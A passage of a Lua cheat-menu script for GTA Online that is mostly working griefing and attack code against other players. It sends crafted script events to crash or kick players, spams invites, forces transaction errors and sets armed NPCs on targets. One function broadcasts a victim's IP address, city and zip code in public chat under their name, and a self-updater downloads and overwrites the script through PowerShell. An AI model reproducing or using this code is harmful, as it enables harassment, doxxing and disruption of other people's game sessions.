    s.send_se(id, {1228916411, id, get.global_i(1893551 + (1 + (id * 599) + 510))})
    s.wait(100)
    s.send_se(id, get_random_args(927169576, 15))
    s.send_se(id, get_random_args(-1308840134, 15))
    s.send_se(id, get_random_args(436475575, 15))
    s.send_se(id, get_random_args(-290218924, 15))
    s.send_se(id, get_random_args(-368423380, 15))
    s.send_se(id, get_random_args(-614457627, 15))
    s.send_se(id, get_random_args(-1991317864, 15))
    s.send_se(id, {163598572, id, 0, 30583, 0, 0, 0, -328966, 2098891836, 0})
    s.send_se(id, {998716537, id, 1, -1})
    s.send_se(
        id,
        {
            603406648,
            random(32, 2147483647),
            random(-2147483647, 2147483647),
            1,
            115,
            random(-2147483647, 2147483647),
            random(-2147483647, 2147483647),
            random(-2147483647, 2147483647)
        }
    )
    s.send_se(
        id,
        {
            603406648,
            random(-2147483647, -1),
            random(-2147483647, 2147483647),
            1,
            115,
            random(-2147483647, 2147483647),
            random(-2147483647, 2147483647),
            random(-2147483647, 2147483647)
        }
    )
end
function script_crash(id)
    log("Xhax Upgrade", "Sending crash to " .. get.name(id))
    s.send_se(id, get_random_args(2908956942, 15))
    s.send_se(id, get_random_args(962740265, 15))
    s.send_se(id, get_random_args(-1386010354, 15))
    s.send_se(id, get_random_args(-1970125962, 15))
    s.send_se(id, get_random_args(-1767058336, 15))
    s.send_se(id, get_random_args(1757755807, 15))
end
function save_translation(file)
    local out = json:encode_pretty(text)
    local f = open(file, "w")
    f:write(out)
    f:close()
end
function check_for_translations()
    local t = scandir(path["Translations"])
    if t[1] == nil then
        log("X-Force Upgrade", "Creating translation file...")
        save_translation(file["Translation"])
    end
end
function load_translation()
    local t = scandir(path["Translations"])
    local new = json:decode(readAll(path["Translations"] .. [[\]] .. t[1]))
    if new == "" or new == nil then
        goto continue
    end
    for k, v in pairs(new) do
        local found = nil
        for i in pairs(text) do
            if i == k then
                found = true
            end
        end
        if found then
            text[k] = v
        end
    end
    log("X-Force Upgrade", "Loaded Translation: " .. t[1]:gsub("%.json", ""))
    ::continue::
    save_translation(path["Translations"] .. [[\]] .. t[1])
end
function save_hotkeys()
    if s.f_exist(file["Hotkeys"]) == true then
        os.remove(file["Hotkeys"])
    end
    local hotkeyfile = assert(open(file["Hotkeys"], "a"))
    hotkeyfile:write("# Keycodes can be found here: https://help.mjtnet.com/article/262-virtual-key-codes\n\n")
    for i = 1, #table_hotkeys do
        if table_hotkeys[i][2] == nil then
            bind = ""
        else
            bind = tostring(table_hotkeys[i][2])
        end
        hotkeyfile:write(table_hotkeys[i][1] .. "=" .. bind, "\n")
    end
    hotkeyfile:close()
end
function create_hotkeys()
    if s.f_exist(file["Hotkeys"]) then
        return
    end
    log("X-Force Upgrade", "Creating hotkeys file...")
    save_hotkeys()
end
function load_hotkeys()
    local hotkeycnt = 0
    for hotkey in io.lines(file["Hotkeys"]) do
        for i = 1, #table_hotkeys do
            local findhotkey = tostring(table_hotkeys[i][1] .. "=")
            if string.find(hotkey, findhotkey) then
                local hotkey = hotkey:gsub(" +", "")
                local hotkey = hotkey:gsub(findhotkey, "")
                if hotkey ~= nil and hotkey ~= "" then
                    if not hotkey:match("%D") then
                        local hk = tonumber(hotkey)
                        if keycodes[hk] ~= nil then
                            hotkeycnt = hotkeycnt + 1
                            table_hotkeys[i][2] = hk
                            table_hotkeys[i][3] = keytostring(hk)
                        end
                    end
                end
                goto continue
            end
        end
        ::continue::
    end
    log("X-Force Upgrade", "Hotkeys found: " .. hotkeycnt)
end
function reg_hotkey(id)
    reghotkey = true
    local time = os.time() + 10
    keyreleased = nil
    while reghotkey do
        closeWindow()
        CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
        wait()
        if keyreleased ~= nil then
            local keybind = keyreleased
            keyreleased = nil
            if keybind == 27 then
                reghotkey = nil
                openWindow()
                return
            end
            local key = keytostring(keybind)
            if key ~= nil then
                table_hotkeys[id][2] = keybind
                table_hotkeys[id][3] = key
                s.notify(table_hotkeys[id][4] .. " hotkey assigned to: " .. key)
                reghotkey = nil
                save_hotkeys()
                openWindow()
                return
            end
        end
        if time < os.time() then
            s.notify("Time for hotkey registration has expired!")
            reghotkey = nil
            openWindow()
            return
        end
    end
end
function del_hotkey(id)
    table_hotkeys[id][2] = nil
    table_hotkeys[id][3] = "none"
end
function save_settings()
    if s.f_exist(file["Settings"]) == true then
        os.remove(file["Settings"])
    end
    local settingsfile = assert(open(file["Settings"], "a"))
    for i = 1, #table_settings do
        settingsfile:write(table_settings[i][1] .. "=" .. tostring(table_settings[i][2]), "\n")
    end
    settingsfile:close()
end
function create_settings()
    if s.f_exist(file["Settings"]) then
        return
    end
    log("X-Force Upgrade", "Creating settings file...")
    save_settings()
end
function load_settings()
    for setting in io.lines(file["Settings"]) do
        for i = 1, #table_settings do
            local findsetting = tostring(table_settings[i][1] .. "=")
            if setting:find(findsetting) then
                local setting = setting:gsub(" +", "")
                local setting = setting:gsub(findsetting, "")
                table_settings[i][2] = toboolean(setting)
                goto continue
            end
        end
        ::continue::
    end
    log("X-Force Upgrade", "Settings loaded")
end
function save_veh_bl()
    if s.f_exist(file["VehicleBlacklist"]) then
        os.remove(file["VehicleBlacklist"])
    end
    local blacklistfile = assert(open(file["VehicleBlacklist"], "a"))
    for i = 1, #vehicle_bl do
        blacklistfile:write(VehicleModel[i][1] .. "=" .. tostring(vehicle_bl[i][2]), "\n")
    end
    blacklistfile:close()
    wait()
    blacklisted_vehs = {}
    for i = 1, #vehicle_bl do
        if vehicle_bl[i][2] == true then
            insert(blacklisted_vehs, tostring(vehicle_bl[i][1]))
        end
    end
end
function reset_veh_bl()
    for i = 1, #vehicle_bl do
        vehicle_bl[i][2] = false
    end
    save_veh_bl()
end
function create_vehbl()
    if s.f_exist(file["VehicleBlacklist"]) then
        return
    end
    save_veh_bl()
    log("Xhax Upgrade", "Creating Vehicle Blacklist file...")
end
function load_blvehs()
    for veh in io.lines(file["VehicleBlacklist"]) do
        for i = 1, #vehicle_bl do
            local findveh = tostring(VehicleModel[i][1] .. "=")
            if string.find(veh, findveh) then
                local veh = veh:gsub(" +", "")
                local veh = veh:gsub(findveh, "")
                vehicle_bl[i][2] = toboolean(veh)
                goto continue
            end
        end
        ::continue::
    end
    log("Xhax Upgrade", "Vehicle Blacklist loaded")
end
function check_for_version_change()
    if not s.f_exist(file["Version"]) then
        return
    end
    for line in io.lines(file["Version"]) do
        if line ~= version then
            table_settings[3][2] = true
            goto continue
        end
    end
    ::continue::
    local vfile = open(file["Version"], "w")
    vfile:write(version)
    vfile:close()
end
function check_for_updates()
    log("X-Force Upgrade", "Checking for Updates..")
    local ver = nil
    local handle =
        popen(
        "powershell -command (New-Object System.Net.WebClient).DownloadString( 'https://raw.githubusercontent.com/Mcarxy/X-Force-Upgrade/main/Xhax')"
    )
    s.wait(2000)
    local result = handle:read("*a")
    handle:close()
    for _, x in ipairs(split(result, "\n")) do
        if x:find("ver") then
            ver = x
        end
    end
    if ver ~= version then
        log("X-Force Upgrade", "New Update available " .. ver)
        s.notify("New update available!", 2000)
        if table_settings[7][2] == true then
            os.rename(file["XhaxScript"], file["XhaxScript"] .. "2")
            log("X-Force Upgrade", "Downloading update...")
            s.notify("Downloading update..", 500)
            s.wait(300)
            local handle =
                popen(
                "powershell -command Invoke-WebRequest -Uri '" ..
                github .. "X-Force Upgrade.lua' -OutFile '" .. file["XhaxScript"] .. "'"
            )
            s.wait(2000)
            handle:close()
            local t = scandir(path["ScriptData"])
            for p = 1, #t do
                if t[p] ~= "Animlist.lua" then
                    os.remove(path["ScriptData"] .. [[\]] .. t[p])
                end
            end
            os.remove(file["XhaxScript"] .. "2")
            s.notify("Update downloaded successfully!", 5000)
            dorestart()
        end
    end
end
function OnKeyBind()
    keyreleased = nil
    while hotkeys do
        for i = 1, #table_hotkeys do
            if reghotkey then
                goto continue
            end
            if table_hotkeys[i][2] ~= nil then
                foundhk = true
                if keyreleased ~= nil then
                    if
                        keyreleased == table_hotkeys[i][2] --[[if i==1 then ClearSelf() end]] --[[if i==2 then RespawnLoc() end]] --[[if i==3 then WalkOnWater() end]] --[[if i==4 then SmashAbility() end]] --[[if i==5 then HardImpact() end]] --[[if i==6 then LocalVis() end]] --[[if i==7 then NoClip() end]] --[[if i==8 then DemiGod() end]]
                     then
                        if i == 9 then
                            ewo()
                        end
                        if i == 10 then
                            sky_dive()
                        end --[[if i==11 then ForceOutfit() end]]
                        if i == 12 then
                            bounty_all()
                        end
                        if i == 13 then
                            infinite_inviteall()
                        end
                        if i == 14 then
                            trapall()
                        end
                        if i == 15 then
                            session_give_weapons()
                        end --[[if i==16 then ShowInvisiblePlayers() end]] --[[if i==17 then TransactionError() end]] --[[if i==18 then BlockPussive() end]] --[[if i==19 then BribeAuth() end]] --[[if i==20 then OffRadar() end]] --[[if i==21 then VehicleBl() end]]
                        if i == 22 then
                            load_weapons()
                        end --[[if i==23 then AirstrikeGun() end]] --[[if i==24 then PickUpGun() end]] --[[if i==25 then AccelGun() end]] --[[if i==26 then DriveGun() end]] --[[if i==27 then FlameThrower_() end]] --[[if i==28 then XmassGun() end]] --[[if i==29 then KickGun() end]] --[[if i==30 then SpeedoLicence() end]] --[[if i==31 then XFLicence() end]] --[[if i==32 then AutoFlip() end]] --[[if i==33 then AntiLockOn() end]] --[[if i==34 then VehRapid() end]] --[[if i==35 then RocketBoost() end]] --[[if i==36 then DisableVehicles() end]] --[[if i==37 then DisablePeds() end]] --[[if i==38 then DelCams() end]] --[[if i==39 then LaunchUpVehicles() end]] --[[if i==40 then LaunchUpPeds() end]] --[[if i==41 then RepairNearby() end]] --[[if i==42 then GodNearby() end]] --[[if i==43 then MaxAcceleration() end]] --[[if i==44 then HornHavoc() end]] --[[if i==45 then ExplodeOnImpact() end]] --[[if i==46 then HotTraffic() end]] --[[if i==47 then BouncyVehs() end]] --[[if i==48 then Beyblades_() end]] --[[if i==49 then TirePopin() end]] --[[if i==50 then SpammyDoors() end]] --[[if i==51 then WaypointAirstrike() end]]
                        if i == 52 then
                            ceo_all(1)
                        end
                        if i == 53 then
                            ceo_all(2)
                        end
                        if i == 54 then
                            drivepersonalveh()
                        end
                        if i == 55 then
                            tp_veh_to_self()
                        end
                        if i == 56 then
                            copy_pos()
                        end
                        if i == 57 then
                            insta_exit()
                        end
                        if i == 58 then
                            drivelastveh()
                        end
                        if i == 59 then
                            tp_to_last_veh()
                        end --[[if i==60 then SlamVeh() end]]
                    end
                end
            end
            ::continue::
        end
        if foundhk then
            keyreleased = nil
            foundhk = nil
        end
        wait()
    end
end
function mk2_lester(pid)
    local pedp = get.ped(pid)
    if get.player_in_veh(pid) then
        heading = get.heading(pid)
        pos = get.offset_coords(pedp, 0, -2, 10)
    else
        heading = get.heading(pid)
        heading = heading - 180
        pos = get.offset_coords(pedp, 0, 8, 2)
    end
    local model = get.hash("ig_lestercrest_2")
    rqModel(model)
    local i = #lester + 1
    lester[i] = set.ped(6, model, pos.x, pos.y, pos.z, heading, true, false)
    if table_settings[5][2] == true then
        set.godmode(lester[i], true)
    end
    set.model_as_noneeded(model)
    local vehhash = get.hash("Oppressor2")
    rqModel(vehhash)
    local y = #lesveh + 1
    lesveh[y] = set.veh(vehhash, pos.x, pos.y, pos.z, heading, true, false, false)
    VEHICLE.SET_VEHICLE_MOD_KIT(lesveh[y], 0)
    VEHICLE.GET_VEHICLE_MOD(lesveh[y], 10)
    set.veh_mod(lesveh[y], 10, 1, false)
    if table_settings[5][2] == true then
        SetVehicleGod(lesveh[y], true)
    end
    set.locked(lesveh[y], 5)
    rqCtrl(lesveh[y])
    set.ped_combat(lester[i], 46, true)
    set.ped_combat(lester[i], 52, true)
    set.ped_combat(lester[i], 1, true)
    set.ped_combat(lester[i], 2, true)
    PED.SET_PED_COMBAT_RANGE(lester[i], 2)
    PED.SET_PED_COMBAT_ABILITY(lester[i], 2)
    PED.SET_PED_COMBAT_MOVEMENT(lester[i], 2)
    PED.SET_PED_INTO_VEHICLE(lester[i], lesveh[y], -1)
    TASK.TASK_VEHICLE_FOLLOW(lester[i], lesveh[y], pedp, 180, 16777216, 10)
    set.locked(lesveh[y], 6)
    set.locked(lesveh[y], 2)
    TASK.TASK_COMBAT_PED(lester[i], pedp, 0, 16)
    s.give_weapon(lester[i], -494615257, 9999, false)
    PED.SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT(lester[i], false)
    set.model_as_noneeded(vehhash)
end
function lesterattacker(pid)
    local pedp, heading, model = get.ped(pid), get.heading(pid) - 180, get.hash("ig_lestercrest_2")
    local pos = get.offset_coords(pedp, 0, 8, 2)
    local lester = set.ped(6, model, pos.x, pos.y, pos.z, heading, true, false)
    get.control(lester)
    if table_settings[5][2] == true then
        set.godmode(lester, true)
    end
    s.give_weapon(lester, 1119849093, 9999, true)
    set.ped_combat(lester, 46, true)
    set.ped_combat(lester, 52, true)
    set.ped_combat(lester, 1, true)
    set.ped_combat(lester, 2, true)
    PED.SET_PED_COMBAT_RANGE(lester, 2)
    PED.SET_PED_COMBAT_ABILITY(lester, 2)
    PED.SET_PED_COMBAT_MOVEMENT(lester, 2)
    PED.SET_PED_ACCURACY(lester, 100)
    PED.SET_PED_FIRING_PATTERN(lester, -957453492)
    PED.SET_PED_SHOOT_RATE(lester, 1000)
    TASK.TASK_COMBAT_PED(lester, pedp, 0, 16)
    PED.SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT(lester, false)
    set.model_as_noneeded(model)
end
function pedsattack(player)
    local pedp, peds = get.ped(player), getAllPeds()
    for i = 1, #peds do
        if s.ent_exist(peds[i]) then
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                get.control(peds[i])
            end
        end
    end
    for i = 1, #peds do
        if s.ent_exist(peds[i]) then
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                get.control(peds[i])
                if table_settings[5][2] == true then
                    set.godmode(peds[i], true)
                end
                s.give_weapon(peds[i], 324215364, 9999, true)
                set.ped_combat(peds[i], 46, true)
                set.ped_combat(peds[i], 52, true)
                set.ped_combat(peds[i], 1, true)
                set.ped_combat(peds[i], 2, true)
                PED.SET_PED_COMBAT_RANGE(peds[i], 2)
                PED.SET_PED_COMBAT_ABILITY(peds[i], 2)
                PED.SET_PED_COMBAT_MOVEMENT(peds[i], 2)
                PED.SET_PED_ACCURACY(peds[i], 100)
                PED.SET_PED_FIRING_PATTERN(peds[i], -957453492)
                PED.SET_PED_SHOOT_RATE(peds[i], 1000)
                TASK.TASK_COMBAT_PED(peds[i], pedp, 0, 16)
                TASK.TASK_VEHICLE_CHASE(peds[i], pedp)
                PED.SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT(peds[i], false)
            end
        end
    end
end
function lag_vehicle_boost(player)
    local plyveh = get.veh(player)
    rqCtrl(plyveh, 500)
    VEHICLE.SET_VEHICLE_ROCKET_BOOST_ACTIVE(plyveh, true)
    VEHICLE.SET_VEHICLE_ROCKET_BOOST_REFILL_TIME(plyveh, 999999.999999999999)
end
function fast_vehicle_boost(player)
    local plyveh = get.veh(player)
    rqCtrl(plyveh, 500)
    VEHICLE.SET_VEHICLE_ROCKET_BOOST_REFILL_TIME(plyveh, 0.0000010)
end
function block_shit(object, posx, posy, posz, rotx, roty, rotz, invisible)
    rqModel(object)
    local obj = set.obj(object, posx, posy, posz, true, false, false)
    set.coords_no_off(obj, posx, posy, posz)
    set.rotation(obj, rotx, roty, rotz, 5, true)
    set.freeze(obj, true)
    if not invisible then
        return
    end
    ENTITY.SET_ENTITY_VISIBLE(obj, false, false)
    set.model_as_noneeded(object)
end
function teleport_vehicle(x, y, z)
    local player = get.selected()
    local vehicle = get.veh(player)
    if rqCtrl(vehicle, 500) then
        set.coords_no_off(vehicle, x, y, z)
    end
end
function tp_player_to_wp()
    local wp = UI.GET_WAYPOINT_BLIP_ENUM_ID()
    local blipid = UI.GET_FIRST_BLIP_INFO_ID(wp)
    if not UI.DOES_BLIP_EXIST(blipid) then
        s.notify(text["No waypoint has been set!"])
        return
    end
    local veh = get.veh(get.selected())
    local pos = UI.GET_BLIP_INFO_ID_COORD(blipid)
    teleport_vehicle(pos.x, pos.y, 800)
    if rqCtrl(veh) then
        set.velocity(veh, 0, 0, -500)
    end
end
function explode_vehicle(player)
    local vehicle = get.veh(player)
    if rqCtrl(vehicle, 500) then
        SetVehicleGod(vehicle, false)
        VEHICLE.EXPLODE_VEHICLE(vehicle, true, false, true)
    end
end
function burst_tyres(player)
    local vehicle = get.veh(player)
    if rqCtrl(vehicle, 500) then
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, true)
        for i = 0, 5 do
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, i, true, 1000.0)
        end
    end
end
function boost_backwards(player)
    local vehicle = get.veh(player)
    if rqCtrl(vehicle, 500) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, -1000)
    end
end
function flip(player)
    local vehicle = get.veh(player)
    local rot = ENTITY.GET_ENTITY_ROTATION(vehicle, 5)
    if rqCtrl(vehicle, 500) then
        set.rotation(vehicle, rot.x - 180, rot.y, rot.z, 5, true)
    end
end
function rotate(player)
    local vehicle = get.veh(player)
    local rot = ENTITY.GET_ENTITY_ROTATION(vehicle, 5)
    if rqCtrl(vehicle, 500) then
        set.rotation(vehicle, rot.x, rot.y, rot.z - 180, 5, true)
    end
end
function ragdoll(player)
    local playerped = get.ped(player)
    local playerpos = get.ent_coords(playerped)
    set.explosion(playerpos.x, playerpos.y, playerpos.z + 2, 64, 10, false, false, 0, false)
end
function inferno(player)
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_recrash_rescue")
    while not GRAPHICS.HAS_NAMED_PTFX_ASSET_LOADED("scr_recrash_rescue") do
        GRAPHICS.REQUEST_NAMED_PTFX_ASSET("scr_recrash_rescue")
        wait()
    end
    for i = 1, 5 do
        GRAPHICS.START_PARTICLE_FX_LOOPED_ON_ENTITY(
            "scr_recrash_rescue_fire",
            get.ped(player),
            0,
            0,
            0,
            0,
            0,
            0,
            1,
            false,
            false,
            false
        )
        wait()
    end
    ragdoll(player)
    s.wait(1000)
    local time = os.time() + 3
    while not ENTITY.IS_ENTITY_DEAD(get.ped(player)) do
        ragdoll(player)
        s.wait(100)
        if time < os.time() then
            return
        end
    end
end
function spawn_puma(player)
    local playerped = get.ped(player)
    local MountainLion = 307287994
    rqModel(MountainLion)
    local coords = get.offset_coords(playerped, 0, -5, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(playerped)
    puma = set.ped(6, MountainLion, coords.x, coords.y, coords.z, heading, true, false)
    set.model_as_noneeded(MountainLion)
    if table_settings[5][2] == true then
        set.godmode(puma, true)
    end
    PED.SET_PED_AS_ENEMY(puma, true)
    set.ped_combat(puma, 46, true)
    set.ped_combat(puma, 5, true)
    set.ped_combat(puma, 1424, true)
    PED.SET_PED_COMBAT_ABILITY(puma, 2)
    TASK.TASK_COMBAT_PED(puma, playerped, 0, 16)
end
function gas_player(player)
    local ped = get.ped(player)
    s.clear_task(ped)
    local pos = get.ent_coords(ped)
    set.explosion(pos.x, pos.y, pos.z, 21, 1, true, false, 0, false)
    set.explosion(pos.x + 2, pos.y, pos.z, 21, 1, true, false, 0, false)
    set.explosion(pos.x, pos.y + 2, pos.z, 21, 1, true, false, 0, false)
    set.explosion(pos.x - 2, pos.y, pos.z, 21, 1, true, false, 0, false)
    set.explosion(pos.x, pos.y - 2, pos.z, 21, 1, true, false, 0, false)
    cage = set.obj(959275690, pos.x, pos.y + 0.5, pos.z - 1, true, false, false)
    set.freeze(cage, true)
end
function send_message(messege, sender)
    if sender then
        NETWORK.SEND_CHAT_MESSAGE_AS(sender, tostring(messege), false)
    else
        NETWORK.SEND_CHAT_MESSAGE(tostring(messege), false)
    end
end
function send_ip(player)
    if player ~= get.id() then
        local info = get_player_info(player)
        if info ~= nil then
            if info[10] == "true" then
                mes = "My IP address is " .. info[3] .. "\nI'm using VPN!"
            else
                mes =
                    "My IP address is " ..
                    info[3] ..
                        "\nI'm NOT using VPN!\nI'm from " ..
                            info[5] ..
                                " and I live in\nRegion: " .. info[6] .. "\nCity: " .. info[7] .. "\nZip: " .. info[8]
            end
            send_message(mes, player)
        end
    end
end
function copy_info(player)
    local info = get_player_info(player)
    if info ~= nil then
        MISC.TO_CLIPBOARD(
            info[1] ..
                " - " ..
                    info[2] ..
                        " - " ..
                            info[3] ..
                                " - Continent: " ..
                                    info[4] ..
                                        " - Country: " ..
                                            info[5] ..
                                                " - RegionName: " ..
                                                    info[6] ..
                                                        " - City: " ..
                                                            info[7] ..
                                                                " - Zip: " ..
                                                                    info[8] ..
                                                                        " - ISP: " .. info[9] .. " - VPN: " .. info[10]
        )
        s.notify(text["Info copied"], 1000)
        log(
            "Xhax Upgrade",
            info[1] ..
                " - " ..
                    info[2] ..
                        " - " ..
                            info[3] ..
                                " - Continent: " ..
                                    info[4] ..
                                        " - Country: " ..
                                            info[5] ..
                                                " - RegionName: " ..
                                                    info[6] ..
                                                        " - City: " ..
                                                            info[7] ..
                                                                " - Zip: " ..
                                                                    info[8] ..
                                                                        " - ISP: " .. info[9] .. " - VPN: " .. info[10]
        )
    end
end
function set_bounty(target, amount)
    if anonymous then
        anonymous = 1
    else
        anonymous = 0
    end
    local bounty = amount or bounty
    for id = 0, 31 do
        s.send_se(
            id,
            {
                1294995624,
                id,
                target,
                1,
                bounty,
                0,
                anonymous,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                get.global_i(1921039 + 9),
                get.global_i(1921039 + 10)
            }
        )
    end
end
function bounty_all()
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(i) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        set_bounty(i)
        ::continue::
        wait()
    end
end
function kick_all()
    if s.ishost() then
        for i = 0, 31 do
            if i == get.id() then
                goto continue
            end
            if s.is_friend(i) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(i) then
                goto continue
            end
            log("Xhax Upgrade", "Kicking " .. get.name(i))
            s.kick(i)
            s.wait(10)
            ::continue::
        end
    else
        for i = 0, 31 do
            if i == get.id() then
                goto continue
            end
            if s.is_friend(i) and table_settings[1][2] == true then
                goto continue
            end
            if not s.is_valid(i) then
                goto continue
            end
            script_kick(i)
            s.wait(10)
            ::continue::
        end
    end
end
function crash_all()
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(i) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        script_crash(i)
        s.wait(10)
        ::continue::
    end
end
function KickBarcode()
    while kick_barcode == true do
        if s.session_started() then
            for i = 0, 31 do
                if i == get.id() then
                    goto continue
                end
                if s.is_friend(i) and table_settings[1][2] == true then
                    goto continue
                end
                if not s.is_valid(i) then
                    goto continue
                end
                local name = get.name(i)
                local name = name:lower()
                local charcnt = #string.gsub(name, "[^il]", "")
                local percent = charcnt / #name * 100
                if percent > 50 then
                    if s.ishost() then
                        log("Xhax Upgrade", "Kicking " .. name)
                        s.kick(i)
                        s.wait(10)
                    else
                        script_kick(i)
                        s.wait(10)
                    end
                end
                ::continue::
            end
        end
        s.wait(1000)
    end
end
function RemoveSpambots()
    local rid = -1
    while removespambot do
        if s.session_started() then
            for i = 0, 31 do
                if i == get.id() then
                    goto continue
                end
                if s.is_friend(i) and table_settings[1][2] == true then
                    goto continue
                end
                if not s.is_valid(i) then
                    goto continue
                end
                rid = get.scid(i)
                for _, v in ipairs(SpamBotRID) do
                    if v == rid then
                        log("Xhax Upgrade", "Possible spambot RID found in lobby: " .. get.name(i))
                        script_crash(i)
                        if s.is_host() then
                            log("Xhax Upgrade", "Kicking " .. get.name(i))
                            s.kick(i)
                        end
                        goto continue
                    end
                end
                ::continue::
                wait()
            end
        end
        s.wait(5000)
    end
end
function block_passive(ID)
    s.send_se(ID, {1114091621, ID, 1})
end
function transaction_error(ID)
    s.send_se(
        ID,
        {
            -1704141512,
            ID,
            50000,
            0,
            1,
            get.global_i(1893551 + (1 + (ID * 599) + 510)),
            get.global_i(1921039 + 9),
            get.global_i(1921039 + 10),
            1
        }
    )
end
function transaction_err(ID)
    while transerr[ID] do
        transaction_error(ID)
        if not s.is_valid(ID) then
            return
        end
        s.wait(10)
    end
end
function force_cutscene(ID)
    s.send_se(ID, {1068259786, ID})
end
function crush_player(player)
    local pos = get.coords(player)
    local ped = get.ped(player)
    local hash = 782665360
    rqModel(hash)
    s.clear_task(ped)
    s.wait(10)
    local veh = set.veh(hash, pos.x, pos.y, pos.z + 15, 0, true, false, false)
    set.model_as_noneeded(hash)
    set.locked(veh, 2)
    rqCtrl(veh)
    s.clear_task(ped)
    if s.has_control(veh) then
        s.apply_force(veh, 1, 0, 0, -20, true, false, true, false)
    end
    s.wait(2000)
    rqCtrl(veh)
    delEnt(veh)
end
function trap_player(player)
    local pos = get.coords(player)
    trapmodel = set.obj(1125864094, pos.x, pos.y, pos.z - 10, true, false, false)
    set.rotation(trapmodel, 0, 90, 0, 5, false)
    ENTITY.SET_ENTITY_VISIBLE(trapmodel, false, false)
end
function trapall()
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(i) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        local pos = get.coords(i)
        trapmodel = set.obj(1125864094, pos.x, pos.y, pos.z - 10, true, false, false)
        set.rotation(trapmodel, 0, 90, 0, 5, false)
        ENTITY.SET_ENTITY_VISIBLE(trapmodel, false, false)
        ::continue::
    end
end
function send_all_mission()
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(i) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        s.send_se(i, {2020588206, i})
        ::continue::
    end
end
function infinite_inviteall()
    for i = 0, 31 do
        if i == get.id() then
            goto continue
        end
        if s.is_friend(i) and table_settings[1][2] == true then
            goto continue
        end
        if not s.is_valid(i) then
            goto continue
        end
        s.send_se(i, {603406648, i, i, 4294967295, 1, 115, 0, 0, 0})
        ::continue::
    end
end
function infinite_invite(id)
    s.send_se(id, {603406648, id, id, 4294967295, 1, 115, 0, 0, 0})
end
function lester_takes_the_wheel(pid)
    if not get.player_in_veh(pid) then
        return
    end
    local pedp = get.ped(pid)
    local pos = get.coords(pid)
    local model = get.hash("ig_lestercrest_2")
    rqModel(model)
    local i = #lester + 1
    lester[i] = set.ped(6, model, pos.x, pos.y, pos.z - 5, 0, true, false)
    if table_settings[5][2] == true then
        set.godmode(lester[i], true)
    end
    set.model_as_noneeded(model)
    playerveh = get.veh(pid)
    s.clear_task(pedp)
    while pedp == VEHICLE.GET_PED_IN_VEHICLE_SEAT(playerveh, -1, true) do
        s.wait(10)
    end
    rqCtrl(playerveh, 500)
    PED.SET_PED_INTO_VEHICLE(lester[i], playerveh, -1)
    TASK.TASK_VEHICLE_DRIVE_WANDER(lester[i], playerveh, 200, 786603)
    if rqCtrl(playerveh, 500) then
        set.locked(playerveh, 5)
        set.locked(playerveh, 6)
        set.locked(playerveh, 2)
    end
    s.give_weapon(lester[i], -494615257, 9999, false)
    set.ped_combat(lester[i], 46, true)
    set.ped_combat(lester[i], 52, true)
    set.ped_combat(lester[i], 1, true)
    set.ped_combat(lester[i], 2, true)
    PED.SET_PED_COMBAT_RANGE(lester[i], 2)
    PED.SET_PED_COMBAT_ABILITY(lester[i], 2)
    PED.SET_PED_COMBAT_MOVEMENT(lester[i], 2)
    PED.SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT(lester[i], false)
end
function fuckup_player(pid)
    pid = pid or get.selected()
    s.send_se(pid, {603406648, pid, 2, 4294967295, 1, 115, 0, 0, 0})
end
function hard_vehicle_sex(pid)
    if not get.player_in_veh(pid) then
        return
    end
    if VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(get.veh(pid))) == 1 then
        return
    end
    local model = -2126242959
    rqModel(model)
    local pos, veh = get.coords(pid), get.veh(pid)
    local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, 0, false)
    s.clear_task(ped)
    local bitch = set.ped(6, model, pos.x, pos.y, pos.z + 5, 0, true, false)
    set.model_as_noneeded(model)
    set.freeze(bitch, true)
    set.godmode(bitch, true)
    PED.SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT(bitch, false)
    for i = 1, #bitchoutfit do
        set.comp_var(bitch, i - 1, bitchoutfit[i][1], bitchoutfit[i][2], 0)
    end
    if rqCtrl(veh, 500) then
        PED.SET_PED_INTO_VEHICLE(bitch, veh, 0)
        PED.SET_PED_FLEE_ATTRIBUTES(bitch, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(bitch, 17, true)
        PlayAnim(bitch, "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, 8.0, -1, anim_flag.Loop, 1.0, false)
        rqModel(-1528307545)
        local obj = set.obj(-1528307545, pos.x, pos.y, pos.z + 5, true, false, false)
        local obj2 = set.obj(-1528307545, pos.x, pos.y, pos.z + 5, true, false, false)
        set.model_as_noneeded(-1528307545)
        s.attach(obj, obj2, 0, 0, 0, 0, 0, 90, 0, false, false, true, false, 5, false)
        s.attach(obj2, bitch, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 5, false)
        if rqCtrl(veh, 500) then
            set.locked(veh, 6)
            set.locked(veh, 4)
        end
    end
end
function no_rockets(pid)
    local veh = get.veh(pid)
    if rqCtrl(veh, 500) then
        VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
        set.veh_mod(veh, 10, -1, false)
    end
end
